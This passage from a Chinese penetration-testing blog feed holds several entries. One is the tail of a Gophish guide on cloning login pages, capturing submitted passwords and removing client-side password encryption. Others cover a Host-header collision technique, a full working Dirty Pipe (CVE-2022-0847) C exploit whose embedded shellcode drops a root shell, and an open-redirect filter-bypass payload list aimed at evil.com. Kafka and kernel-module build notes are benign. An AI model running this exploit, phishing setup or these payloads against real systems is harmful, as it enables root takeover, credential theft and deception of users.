<p>可直接克隆站点【Import Site】，如果需要抓取账号密码的话，把【Capture Submitted Data 】勾选。<br>在用户点击提交按钮后想跳转的话在【Redirect to】填入要跳转的URL</p>
<blockquote>
<p>这里需要注意的是，如果想要跳转必须是标准的form表单格式,表单（POST方式）— Input标签（具有name属性）Input标签（submit类型）,如果不是则无法捕获数据，且重定向也会有问题。样式如下</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form method=&quot;post&quot; ···&gt;</span><br><span class="line">  &lt;input name=&quot;username&quot; ··· /&gt; </span><br><span class="line">  &lt;input name=&quot;password&quot; ··· /&gt; </span><br><span class="line">  &lt;input type=&quot;submit&quot; ··· /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<h4 id="钓鱼工作面板配置-发送钓鱼邮件"><a href="#钓鱼工作面板配置-发送钓鱼邮件" class="headerlink" title="钓鱼工作面板配置&amp;发送钓鱼邮件"></a>钓鱼工作面板配置&amp;发送钓鱼邮件</h4><p><img src="/images/blog/45f566b8c7b44bdc9bf2f352ebc5a69f.png"><br>释意如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Name:			项目名称</span><br><span class="line">Email Template:		使用哪个邮件模板</span><br><span class="line">Landing Page:		使用哪个钓鱼页面</span><br><span class="line">URL: 			钓鱼页面URL---就是我们上面配置的【listen_url】配置是0.0.0.0:80，这里填入公网的IP和端口【http://公网IP:80】</span><br><span class="line">Launch Date		什么时候发送</span><br><span class="line">Sending Profile:	谁来发送</span><br><span class="line">Groups:			发送给谁</span><br></pre></td></tr></table></figure>
<p>收到的邮件信息如下：<br><img src="/images/blog/e8f3b4d3c493528f4177f02ca52653ff.png"></p>
<p>点击如下图标，可查看此工程详细信息<br><img src="/images/blog/178ba2b42eade914f80394ec4304c4cb.png"></p>
<p><img src="/images/blog/d52cba7a769b0c1dfa0a6bcc7c712fe3.png"></p>
<p>展开详细信息页面可以看到捕获到的用户填写的信息<br><img src="/images/blog/aca2fe8b6204de037c0540e82a354cb6.png"></p>
<p>0x5 其它注意事项</p>
<ul>
<li>【捕获不到提交的数据】在满足第2点的结构的情况下，还需要求&lt;form method&#x3D;”post” ···&gt;在浏览器解析渲染后（即预览情况下）不能包含action属性，或者action属性的值为空。</li>
</ul>
<p>否则将会把表单数据提交给action指定的页面，而导致无法被捕获到 。</p>
<ul>
<li><p>【捕获数据不齐全】对于需要被捕获的表单数据，除了input标签需要被包含在中，还需满足该存在name属性。例如&lt;input name&#x3D;”username”&gt;,否则会因为没有字段名而导致value被忽略 。</p>
</li>
<li><p>【密码被加密】针对https页面的import，通常密码会进行加密处理，这时需要通过审计导入的前端代码，找到加密的JavaScript函数（多数情况存在于单独的js文件中，通过src引入），将其在gophish的HTML编辑框中删除，阻止表单数据被加密 。<br>以上5点是在实践中总结出来的宝贵经验，或许还有其他许多坑未填，但所有的坑通常都围绕在&lt;form&gt;&lt;input &#x2F;&gt;</form>结构中，所以如果遇到新坑，先将该结构排查一遍，还是不行，再另辟蹊径。</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title>Host碰撞漏洞利用</title>
    <url>/2024/09/10/Host%E7%A2%B0%E6%92%9E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h3 id="0x1-原理"><a href="#0x1-原理" class="headerlink" title="0x1 原理"></a>0x1 原理</h3><p>nginx类似的软件做为中间件时，可通过配置，同一IP通过不同域名访问不同的资源，漏洞由此产生</p>
<h3 id="0x2-可碰撞的配置"><a href="#0x2-可碰撞的配置" class="headerlink" title="0x2 可碰撞的配置"></a>0x2 可碰撞的配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;   #server1</span><br><span class="line">  listen 80;</span><br><span class="line">  server_name test.com;</span><br><span class="line">  localtion &#123;</span><br><span class="line">      root /usr/www/html;</span><br><span class="line">      index index.html; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server &#123;   #server2</span><br><span class="line">  listen 80;</span><br><span class="line">  server_name _;</span><br><span class="line">  return 400;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x3-测试"><a href="#0x3-测试" class="headerlink" title="0x3 测试"></a>0x3 测试</h3><p>不加Host测试<br><img src="/images/blog/78b2cd00bd52b12cfb940678219df638.png"></p>
<p>加Host测试<br><img src="/images/blog/40dfd658f4914ea1fad95de56af00b06.png"></p>
<h3 id="0x4-burp利用"><a href="#0x4-burp利用" class="headerlink" title="0x4 burp利用"></a>0x4 burp利用</h3><p>通过工具碰撞到存在漏洞的IP域名时，通过配置burp的proxy<br><img src="/images/blog/0fc75697f854ac8301892de01091d0ef.png"></p>
<p>然后通过IP访问网站<br>未配置替换时：<br><img src="/images/blog/308edf02845e3c8593bbc28b4aabfe0f.png"></p>
<p>配置替换时<br><img src="/images/blog/c29d5ed53913273ec69b8fe513cf494c.png"></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 本地权限提升漏洞 CVE-2022-0847</title>
    <url>/2024/09/10/Linux-%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-CVE-2022-0847/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//</span><br><span class="line">// dirtypipez.c</span><br><span class="line">//</span><br><span class="line">// hacked up Dirty Pipe (CVE-2022-0847) PoC that hijacks a SUID binary to spawn</span><br><span class="line">// a root shell. (and attempts to restore the damaged binary as well)</span><br><span class="line">//</span><br><span class="line">// Wow, Dirty CoW reloaded!</span><br><span class="line">//</span><br><span class="line">// -- blasty &lt;peter@haxx.in&gt; // 2022-03-07</span><br><span class="line"></span><br><span class="line">/* SPDX-License-Identifier: GPL-2.0 */</span><br><span class="line">/*</span><br><span class="line"> * Copyright 2022 CM4all GmbH / IONOS SE</span><br><span class="line"> *</span><br><span class="line"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span><br><span class="line"> *</span><br><span class="line"> * Proof-of-concept exploit for the Dirty Pipe</span><br><span class="line"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span><br><span class="line"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span><br><span class="line"> * file contents in the page cache, even if the file is not permitted</span><br><span class="line"> * to be written, immutable or on a read-only mount.</span><br><span class="line"> *</span><br><span class="line"> * This exploit requires Linux 5.8 or later; the code path was made</span><br><span class="line"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span><br><span class="line"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span><br><span class="line"> * there before, it just provided an easy way to exploit it.</span><br><span class="line"> *</span><br><span class="line"> * There are two major limitations of this exploit: the offset cannot</span><br><span class="line"> * be on a page boundary (it needs to write one byte before the offset</span><br><span class="line"> * to add a reference to this page to the pipe), and the write cannot</span><br><span class="line"> * cross a page boundary.</span><br><span class="line"> *</span><br><span class="line"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span><br><span class="line"> *</span><br><span class="line"> * Further explanation: https://dirtypipe.cm4all.com/</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">#ifndef PAGE_SIZE</span><br><span class="line">#define PAGE_SIZE 4096</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">// small (linux x86_64) ELF file matroshka doll that does;</span><br><span class="line">//   fd = open(&quot;/tmp/sh&quot;, O_WRONLY | O_CREAT | O_TRUNC);</span><br><span class="line">//   write(fd, elfcode, elfcode_len)</span><br><span class="line">//   chmod(&quot;/tmp/sh&quot;, 04755)</span><br><span class="line">//   close(fd);</span><br><span class="line">//   exit(0);</span><br><span class="line">//</span><br><span class="line">// the dropped ELF simply does:</span><br><span class="line">//   setuid(0);</span><br><span class="line">//   setgid(0);</span><br><span class="line">//   execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL], [NULL]);</span><br><span class="line">unsigned char elfcode[] = &#123;</span><br><span class="line">	/*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,</span><br><span class="line">	0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,</span><br><span class="line">	0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,</span><br><span class="line">	0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,</span><br><span class="line">	0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,</span><br><span class="line">	0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,</span><br><span class="line">	0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,</span><br><span class="line">	0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,</span><br><span class="line">	0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,</span><br><span class="line">	0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,</span><br><span class="line">	0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,</span><br><span class="line">	0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,</span><br><span class="line">	0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">	0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,</span><br><span class="line">	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,</span><br><span class="line">	0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,</span><br><span class="line">	0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,</span><br><span class="line">	0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,</span><br><span class="line">	0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,</span><br><span class="line">	0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="line"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="line"> */</span><br><span class="line">static void prepare_pipe(int p[2])</span><br><span class="line">&#123;</span><br><span class="line">	if (pipe(p)) abort();</span><br><span class="line"></span><br><span class="line">	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);</span><br><span class="line">	static char buffer[4096];</span><br><span class="line"></span><br><span class="line">	/* fill the pipe completely; each pipe_buffer will now have</span><br><span class="line">	   the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">	for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;</span><br><span class="line">		write(p[1], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="line">	   leaving the flags initialized) */</span><br><span class="line">	for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;</span><br><span class="line">		read(p[0], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* the pipe is now empty, and if somebody adds a new</span><br><span class="line">	   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="line">	   will be mergeable */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int hax(char *filename, long offset, uint8_t *data, size_t len) &#123;</span><br><span class="line">	/* open the input file and validate the specified offset */</span><br><span class="line">	const int fd = open(filename, O_RDONLY); // yes, read-only! :-)</span><br><span class="line">	if (fd &lt; 0) &#123;</span><br><span class="line">		perror(&quot;open failed&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	struct stat st;</span><br><span class="line">	if (fstat(fd, &amp;st)) &#123;</span><br><span class="line">		perror(&quot;stat failed&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* create the pipe with all flags initialized with</span><br><span class="line">	   PIPE_BUF_FLAG_CAN_MERGE */</span><br><span class="line">	int p[2];</span><br><span class="line">	prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">	/* splice one byte from before the specified offset into the</span><br><span class="line">	   pipe; this will add a reference to the page cache, but</span><br><span class="line">	   since copy_page_to_iter_pipe() does not initialize the</span><br><span class="line">	   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br><span class="line">	--offset;</span><br><span class="line">	ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);</span><br><span class="line">	if (nbytes &lt; 0) &#123;</span><br><span class="line">		perror(&quot;splice failed&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	if (nbytes == 0) &#123;</span><br><span class="line">		fprintf(stderr, &quot;short splice\n&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* the following write will not create a new pipe_buffer, but</span><br><span class="line">	   will instead write into the page cache, because of the</span><br><span class="line">	   PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">	nbytes = write(p[1], data, len);</span><br><span class="line">	if (nbytes &lt; 0) &#123;</span><br><span class="line">		perror(&quot;write failed&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	if ((size_t)nbytes &lt; len) &#123;</span><br><span class="line">		fprintf(stderr, &quot;short write\n&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">	if (argc != 2) &#123;</span><br><span class="line">		fprintf(stderr, &quot;Usage: %s SUID\n&quot;, argv[0]);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	char *path = argv[1];</span><br><span class="line">	uint8_t *data = elfcode;</span><br><span class="line"></span><br><span class="line">	int fd = open(path, O_RDONLY);</span><br><span class="line">	uint8_t *orig_bytes = malloc(sizeof(elfcode));</span><br><span class="line">	lseek(fd, 1, SEEK_SET);</span><br><span class="line">	read(fd, orig_bytes, sizeof(elfcode));</span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+] hijacking suid binary..\n&quot;);</span><br><span class="line">	if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) &#123;</span><br><span class="line">		printf(&quot;[~] failed\n&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+] dropping suid shell..\n&quot;);</span><br><span class="line">	system(path);</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+] restoring suid binary..\n&quot;);</span><br><span class="line">	if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) &#123;</span><br><span class="line">		printf(&quot;[~] failed\n&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\n&quot;);</span><br><span class="line">	system(&quot;/tmp/sh&quot;);</span><br><span class="line"></span><br><span class="line">	return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>Kafka常用命令之kafka-console-consumer.sh</title>
    <url>/2024/09/10/Kafka%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E4%B9%8Bkafka-console-consumer-sh/</url>
    <content><![CDATA[<p>kafka-console-consumer.sh 脚本是一个简易的消费者控制台。该 shell 脚本的功能通过调用 kafka.tools 包下的 ConsoleConsumer 类，并将提供的命令行参数全部传给该类实现。</p>
<h3 id="消息消费"><a href="#消息消费" class="headerlink" title="消息消费"></a>消息消费</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin/kafka-console-consumer.sh --bootstrap-server node1:9092,node2:9092,node3:9092 --topic topicName</span><br></pre></td></tr></table></figure>
<p>表示从 latest 位移位置开始消费该主题的所有分区消息，即仅消费正在写入的消息。</p>
<h3 id="从开始位置消费"><a href="#从开始位置消费" class="headerlink" title="从开始位置消费"></a>从开始位置消费</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin/kafka-console-consumer.sh --bootstrap-server node1:9092,node2:9092,node3:9092 --from-beginning --topic topicName</span><br></pre></td></tr></table></figure>
<p>表示从指定主题中有效的起始位移位置开始消费所有分区的消息。</p>
<h3 id="显示key消费"><a href="#显示key消费" class="headerlink" title="显示key消费"></a>显示key消费</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin/kafka-console-consumer.sh --bootstrap-server node1:9092,node2:9092,node3:9092 --property print.key=true --topic topicName</span><br></pre></td></tr></table></figure>
<p>消费出的消息结果将打印出消息体的 key 和 value。</p>
<p>若还需要为你的消息添加其他属性，请参考下述列表。<br>参考：<a href="https://blog.csdn.net/qq_29116427/article/details/80206125">https://blog.csdn.net/qq_29116427/article/details/80206125</a></p>
]]></content>
  </entry>
  <entry>
    <title>LKM缺少内核情况下的编译</title>
    <url>/2024/09/10/LKM%E7%BC%BA%E5%B0%91%E5%86%85%E6%A0%B8%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91/</url>
    <content><![CDATA[<h3 id="0x1-下载"><a href="#0x1-下载" class="headerlink" title="0x1 下载"></a>0x1 下载</h3><p>首先安装或下载 【kernel-devel】文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install kernel-devel -y</span><br></pre></td></tr></table></figure>
<p>如果上面命令没安装成功（目录下没有相关文件 &#x2F;lib&#x2F;modules&#x2F;($uname -r)）</p>
<p>那么就自行下载内核文件，通过Google搜索关键字<br>【kernel-devel-$(uname -r)】<br>下载好后是如下两个文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kernel-devel-3.10.0-327.el7.x86_64.rpm</span><br></pre></td></tr></table></figure>

<h3 id="0x2-解压-移动位置"><a href="#0x2-解压-移动位置" class="headerlink" title="0x2 解压&amp;移动位置"></a>0x2 解压&amp;移动位置</h3><p>下载好后，我们通过如下命令解压：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm2cpio kernel-devel-3.10.0-327.el7.x86_64.rpm | cpio -div</span><br></pre></td></tr></table></figure>

<p>解压完后会在当前目录生成一个【usr】目录，移动文件到对应的目录 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv usr/src/kernels/3.10.0-327.el7.x86_64 /usr/src/kernels/</span><br></pre></td></tr></table></figure>

<h3 id="0x3-编译"><a href="#0x3-编译" class="headerlink" title="0x3 编译"></a>0x3 编译</h3><p>最后进行编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@cslg-10-200-19-71 LKM]# make</span><br><span class="line">|-----------------------------------|</span><br><span class="line">| building HIDS kernel module       |</span><br><span class="line">|-----------------------------------|</span><br><span class="line">make -C /usr/src/kernels/3.10.0-327.el7.x86_64 M=/home/ops/LKM modules</span><br><span class="line">make[1]: 进入目录“/usr/src/kernels/3.10.0-327.el7.x86_64”</span><br><span class="line">  CC [M]  /home/ops/LKM/src/init.o</span><br><span class="line">  CC [M]  /home/ops/LKM/src/kprobe.o</span><br><span class="line">  CC [M]  /home/ops/LKM/src/trace.o</span><br><span class="line">  CC [M]  /home/ops/LKM/src/trace_buffer.o</span><br><span class="line">  CC [M]  /home/ops/LKM/src/smith_hook.o</span><br><span class="line">/home/ops/LKM/src/smith_hook.c:2151:3: 警告：从不兼容的指针类型初始化 [默认启用]</span><br><span class="line">   .hook =  smith_nf_udp_v4_handler,</span><br><span class="line">   ^</span><br><span class="line">/home/ops/LKM/src/smith_hook.c:2151:3: 警告：(在‘g_smith_nf_hooks[0].hook’的初始化附近) [默认启用]</span><br><span class="line">/home/ops/LKM/src/smith_hook.c:2158:3: 警告：从不兼容的指针类型初始化 [默认启用]</span><br><span class="line">   .hook =  smith_nf_udp_v6_handler,</span><br><span class="line">   ^</span><br><span class="line">/home/ops/LKM/src/smith_hook.c:2158:3: 警告：(在‘g_smith_nf_hooks[1].hook’的初始化附近) [默认启用]</span><br><span class="line">  CC [M]  /home/ops/LKM/src/anti_rootkit.o</span><br><span class="line">  CC [M]  /home/ops/LKM/src/filter.o</span><br><span class="line">  CC [M]  /home/ops/LKM/src/util.o</span><br><span class="line">  LD [M]  /home/ops/LKM/hids_driver.o</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">  CC      /home/ops/LKM/hids_driver.mod.o</span><br><span class="line">  LD [M]  /home/ops/LKM/hids_driver.ko</span><br><span class="line">make[1]: 离开目录“/usr/src/kernels/3.10.0-327.el7.x86_64”</span><br><span class="line">make -C test</span><br><span class="line">make[1]: 进入目录“/home/ops/LKM/test”</span><br><span class="line">|---------------------------------|</span><br><span class="line">| building HIDS pipe reader       |</span><br><span class="line">|---------------------------------|</span><br><span class="line">     CC main.ou</span><br><span class="line">building test programs</span><br><span class="line">     CC rst</span><br><span class="line">make[1]: 离开目录“/home/ops/LKM/test</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>URL跳转Byass----ssrf相关</title>
    <url>/2024/09/10/URL%E8%B7%B3%E8%BD%ACByass-ssrf%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<p>Simply try to change the domain</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Example: ?redirect=https://example.com --&gt; ?redirect=https://evil.com</span><br></pre></td></tr></table></figure>

<p>Bypass the filter when protocol is blacklisted using &#x2F;&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Example: ?redirect=https://example.com --&gt; ?redirect=//evil.com</span><br></pre></td></tr></table></figure>
<p>Bypass the filter when double slash is blacklisted using \</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Example: ?redirect=https://example.com --&gt; ?redirect=\evil.com</span><br></pre></td></tr></table></figure>
<p>Bypass the filter when double slash is blacklisted using http: or https:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Example: ?redirect=https://example.com --&gt; ?redirect=https:example.com</span><br></pre></td></tr></table></figure>
<p>Bypass the filter using %40</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Example: ?redirect=example.com --&gt; ?redirect=example.com%40evil.com</span><br></pre></td></tr></table></figure>
<p>Bypass the filter if it only checks for domain name</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Example: ?redirect=example.com --&gt; ?redirect=example.comevil.com</span><br></pre></td></tr></table></figure>
<p>Bypass the filter if it only checks for domain name using a dot %2e</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Example: ?redirect=example.com --&gt; ?redirect=example.com%2eevil.com</span><br></pre></td></tr></table></figure>
<p>Bypass the filter if it only checks for domain name using a query&#x2F;question mark ?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Example: ?redirect=example.com --&gt; ?redirect=evil.com?example.com</span><br></pre></td></tr></table></figure>
<p>Bypass the filter if it only checks for domain name using a hash %23</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Example: ?redirect=example.com --&gt; ?redirect=evil.com%23example.com</span><br></pre></td></tr></table></figure>
<p>Bypass the filter using a ° symbol</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Example: ?redirect=example.com --&gt; ?redirect=example.com/°evil.com</span><br></pre></td></tr></table></figure>

<p>Bypass the filter using a url encoded Chinese dot %E3%80%82</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Example: ?redirect=example.com --&gt; ?redirect=evil.com%E3%80%82%23example.com</span><br></pre></td></tr></table></figure>
<p>Bypass the filter if it only allows you to control the path using a nullbyte %0d or %0a</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Example: ?redirect=/ --&gt; ?redirect=/%0d/evil.com</span><br></pre></td></tr></table></figure>

<h3 id="other-reference"><a href="#other-reference" class="headerlink" title="other reference"></a>other reference</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://highon.coffee/blog/ssrf-cheat-sheet/</span><br></pre></td></tr></table></figure>


<h3 id="0x0-反斜杠绕过"><a href="#0x0-反斜杠绕过" class="headerlink" title="0x0 反斜杠绕过"></a>0x0 反斜杠绕过</h3><h4 id="两个反斜杠绕过方法"><a href="#两个反斜杠绕过方法" class="headerlink" title="两个反斜杠绕过方法"></a>两个反斜杠绕过方法</h4><p>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.aaa.com/acb?Url=http://login.aaa.com/ </span><br></pre></td></tr></table></figure>
<p>同样是在它本身域名前加上两个反斜杠，然后两个反斜杠前面跟上你想跳转的域名地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.aaa.com/acb?Url=http://test.com\login.aaa.com</span><br></pre></td></tr></table></figure>

<h4 id="一个反斜杠绕过方法"><a href="#一个反斜杠绕过方法" class="headerlink" title="一个反斜杠绕过方法"></a>一个反斜杠绕过方法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.aaa.com/acb?Url=http://test.comlogin.aaa.com</span><br></pre></td></tr></table></figure>

<h4 id="另一种思路，一个反斜杠一个点"><a href="#另一种思路，一个反斜杠一个点" class="headerlink" title="另一种思路，一个反斜杠一个点"></a>另一种思路，一个反斜杠一个点</h4><p>利用.这样的格式，也就是一个反斜杠加一个点来跳过限制</p>
